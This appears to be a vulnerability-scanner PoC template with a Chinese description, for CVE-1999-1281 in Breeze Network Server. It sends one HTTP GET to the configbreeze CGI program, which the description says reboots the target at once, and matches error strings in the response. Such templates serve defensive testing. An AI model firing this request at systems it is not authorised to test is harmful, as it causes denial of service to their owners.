[info]
author = "AVE"
description = "验证 Breeze Network Server 开发版本中 configbreeze CGI 程序导致的远程拒绝服务漏洞。通过 HTTP GET 请求访问该 CGI 程序，可使目标系统立即重启"
id = "POC-AVE-1999-1449"
name = "Breeze Network Server configbreeze CGI DoS PoC"
severity = "medium"
tags = [
    "cve-1999-1281",
    "dos",
    "breeze-network-server",
]
vuln_id = [
    "CVE-1999-1281",
    "AVE-1999-1449",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-bin/configbreeze"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "500",
    "Service Unavailable",
    "Connection reset",
]
